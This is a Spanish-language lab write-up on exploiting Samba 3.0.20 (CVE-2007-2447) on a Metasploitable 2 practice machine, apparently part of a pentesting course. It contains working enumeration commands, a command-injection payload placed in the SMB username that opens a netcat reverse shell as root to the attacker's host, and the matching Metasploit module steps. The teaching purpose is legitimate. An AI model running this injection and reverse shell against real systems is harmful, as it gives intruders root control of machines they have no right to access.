# Samba — SMB 3.0.20 (puertos 139 y 445) — Metasploitable 2

> Práctica de laboratorio: aplicar únicamente sobre tu propia máquina Metasploitable 2 (`192.168.100.9`), aislada de Internet. Documento de la serie [Reconocimiento y Metasploit](./01_reconocimiento_y_metasploit.md).

**Qué es:** **Samba** implementa el protocolo **SMB/CIFS** de Windows para compartir carpetas e impresoras en red. Versión **3.0.20**, **puertos 139 y 445**.

**Cómo se explota:** Samba 3.0.20 es vulnerable a **CVE-2007-2447** ("*username map script*"). Cuando está activada la opción `username map script`, el **nombre de usuario** se pasa a un script del sistema sin sanear; si metes comandos de shell en ese campo, se ejecutan **como root**. De nuevo, no es fuerza bruta.

Primero, enumeración de recursos compartidos:

```bash
smbclient -L //192.168.100.9/ -N        # lista shares de forma anónima
enum4linux -a 192.168.100.9             # enumeración completa (usuarios, shares…)
```

## Explotación manual (sin Metasploit)

```bash
# 1. En Kali, ponte a la escucha
nc -lvp 4444

# 2. Lanza la inyección: el payload va en el NOMBRE DE USUARIO
smbclient //192.168.100.9/tmp -N -U "/=`nohup nc -e /bin/bash 192.168.100.8 4444`"
#   El "/=" separa dominio y usuario; el resto se ejecuta como root.

# 3. En la terminal del nc aparece una shell de root:
id        # uid=0(root)
```

## Explotación con Metasploit

```bash
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.100.9
set LHOST 192.168.100.8
run
# -> shell de root
```

---

> **Ver también:** apunte general de enumeración de [SMB/Samba](../../Apuntes%20Generales/03_enumeracion_de_servicios/04_smb.md) en `Apuntes Generales`.
